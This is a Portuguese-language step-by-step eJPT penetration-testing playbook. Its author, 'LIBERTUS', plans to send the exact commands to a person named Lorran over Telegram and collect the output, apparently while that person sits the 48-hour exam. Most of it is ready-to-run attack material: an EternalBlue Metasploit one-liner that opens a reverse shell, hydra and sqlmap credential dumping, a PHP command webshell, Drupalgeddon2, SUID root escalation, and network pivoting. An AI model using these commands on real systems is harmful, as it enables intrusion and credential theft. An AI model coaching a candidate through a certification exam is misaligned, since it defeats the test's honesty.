# CENÁRIOS eJPT — Playbooks Passo a Passo
LIBERTUS · 2026-07-01 · comandos exatos que vou mandar pro Lorran no Telegram.
Regra de ouro: **1 linha de contexto + 1 comando + "me manda o output"**. Sem enrolação.
`<IP>` = alvo · `<KALI>` = meu IP (do `ip addr`).

---

## CENÁRIO A — Porta 445 aberta (SMB) → MS17-010 EternalBlue

**Passo 1 — confirmar a vuln:**
```bash
nmap -p445 --script smb-vuln-ms17-010 <IP>
```
→ me manda o output. Se disser "VULNERABLE" seguimos.

**Passo 2 — pegar meu IP:**
```bash
ip addr
```
→ me manda (preciso do IP do Kali para o LHOST).

**Passo 3 — explorar (ONELINER, cola tudo de uma vez):**
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <IP>; set LHOST <KALI>; run"
```
→ me manda o output. Se abrir "meterpreter >" ganhamos shell.

**Passo 4 — pós-exploração:**
```
getuid
sysinfo
```
Se `getuid` = NT AUTHORITY\SYSTEM → somos admin. Para pegar flag:
```
shell
type C:\Users\Administrator\Desktop\flag.txt
```

**Se der "Cannot reliably check exploitability":** manda no msf `set ForceExploit true` e `run`.
**Se SMB não confirmar ms17-010:** testar `smb-os-discovery` p/ versão, e enumerar shares:
`nmap -p445 --script smb-enum-shares,smb-enum-users <IP>`

---

## CENÁRIO B — Porta 21 aberta (FTP) → anônimo + creds fracas

**Passo 1 — testar login anônimo:**
```bash
nmap -p21 --script ftp-anon <IP>
```
→ se aparecer "Anonymous FTP login allowed", entramos.

**Passo 2 — entrar e listar tudo:**
```bash
ftp <IP>
```
Login: `anonymous` · senha: (só Enter). Depois:
```
ls -la
```
→ me manda o que aparecer. Procuramos: .txt (dicas/creds), webshells (.aspx/.php), backups.

**Passo 3 — baixar arquivos interessantes:**
```
get updates.txt /tmp/updates.txt
get config.txt /tmp/config.txt
bye
```
Depois: `cat /tmp/updates.txt` → me manda.
(Na sessão real, updates.txt tinha a dica "usernames = passwords".)

**Passo 4 — se tiver webshell (.aspx/.php) no dir web:**
Abrir no Chrome: `http://<IP>/cmdasp.aspx` → executa comandos Windows no campo de texto.
`ipconfig /all`, `whoami`, `arp -a`.

**Passo 5 — se não achou nada, brute force com creds fracas:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP> -t 4 -f
```
Antes disso testar manual: admin/admin, root/root, ftp/ftp, anonymous.

---

## CENÁRIO C — Porta 80/8080 aberta (web) → gobuster + sqli + webshell

**Passo 1 — identificar o app:**
```bash
nmap -p80 --script http-title,http-headers,http-enum <IP>
```
→ me manda. Vejo se é WordPress, Drupal, app custom.

**Passo 2 — enumerar diretórios:**
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/common.txt -x php,txt,bak -t 30 -q
```
→ me manda. Foco em: /admin, /login, /upload, /config, arquivos .bak.

**Passo 3 — SQL injection (se achar página com ?id= ou login):**
```bash
sqlmap -u "http://<IP>/page.php?id=1" --batch --dbs
```
Depois extrair users:
```bash
sqlmap -u "http://<IP>/page.php?id=1" -D nomedb -T users --dump --batch
```
→ me manda tabela de usuários/senhas.

**Passo 4 — upload de webshell (se achar /upload ou file upload):**
PHP webshell simples:
```php
<?php system($_GET['c']); ?>
```
Salvar como shell.php, subir, acessar: `http://<IP>/uploads/shell.php?c=id`
(⚠️ no lab INE o "?" não digita no terminal — acessar URL na barra do Chrome.)

**Passo 5 — se for WordPress:**
```bash
curl -s -H "Host: wordpress.local" http://<IP>/ | grep -i themes
```
Para Drupal → Drupalgeddon2:
```bash
msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <IP>; set TARGETURI /drupal; run"
```

---

## CENÁRIO D — Porta 22 aberta (SSH) → creds + brute force

**Passo 1 — banner e versão:**
```bash
nmap -p22 -sV <IP>
```

**Passo 2 — SEMPRE testar creds achadas antes de brutar.**
Se algum arquivo/CMS deu usuário:senha, testar direto:
```bash
ssh usuario@<IP>
```
Reutilização de credenciais é TEMA RECORRENTE no eJPT.

**Passo 3 — brute force direcionado (NÃO rockyou inteiro em SSH — leva horas):**
```bash
# lista curta de users prováveis:
hydra -L /tmp/users.txt -P /tmp/pass_curta.txt ssh://<IP> -t 4 -f -V
```
Ou via metasploit:
```bash
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS <IP>; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run"
```

**Passo 4 — se achar chave SSH privada (id_rsa) em algum lugar:**
```bash
chmod 600 id_rsa
ssh -i id_rsa usuario@<IP>
# se a chave tiver senha:
ssh2john id_rsa > /tmp/keyhash
~/LIBERTUS/ejpt/john_home/jl.sh /tmp/keyhash
```

**Passo 5 — dentro do SSH, privesc:**
```bash
id; sudo -l; find / -perm -4000 2>/dev/null
# SUID find → root:
/usr/bin/find . -exec /bin/sh -p \; -quit
```

---

## CENÁRIO E — Rede /24 descoberta → PIVOTING (Metasploit)

Este foi o GAP da 1ª tentativa. Fluxo completo:

**Passo 1 — já tenho sessão meterpreter num host (ex: .52). Descobrir a rede interna:**
No meterpreter cai no shell e roda:
```
ipconfig /all      (Windows)   OU   ip addr; ip route   (Linux)
arp -a
```
→ me manda. Procuro um 2º range (ex: DNS Server 192.168.0.2 → rede 192.168.0.0/24).

**Passo 2 — adicionar rota (do meterpreter, com a sessão em background):**
```
run autoroute -s 192.168.0.0/24
```
Ou:
```
background
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.0.0
run
```

**Passo 3 — scan da rede interna PELA rota:**
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.0.1-254
set PORTS 22,80,445,3389,10000
run
```
→ me manda os hosts/portas que aparecerem.

**Passo 4 — port forward para atacar host interno direto:**
```
sessions -i 1
portfwd add -l 3389 -p 3389 -r 192.168.0.50
```
Agora `127.0.0.1:3389` no Kali → chega no .50 interno.

**Passo 5 — socks proxy + proxychains (ferramentas externas):**
```
use auxiliary/server/socks_proxy
set VERSION 4a
run
```
Editar `/etc/proxychains.conf` → `socks4 127.0.0.1 1080`. Depois:
```bash
proxychains nmap -sT -Pn -p 445 192.168.0.50
proxychains msfconsole      # exploits pela rota
```

**Comandos-chave para questões teóricas:** `autoroute` (adicionar rota),
`portfwd` (encaminhar porta), `socks_proxy`+`proxychains` (tunelar ferramentas).

---

## Regras transversais (TODOS os cenários)
1. **Sempre começar com nmap na rede inteira.** `nmap -sn` depois `-sV` em cada host.
2. **Anotar tudo:** IPs, portas, versões, credenciais. Cada questão puxa desses dados.
3. **Reutilizar credenciais em TODOS os serviços** — tema recorrente do exame.
4. **48h é muito tempo** — não apressar, mas não travar: após 2 tentativas falhas no mesmo vetor, trocar.
5. **Copy/paste bugado no lab INE** → usar oneliner `msfconsole -q -x`, webshell, ou Telegram.
6. **Caractere "?" não digita no Kali INE** → URLs com ? na barra do Chrome, ou python3 -c.
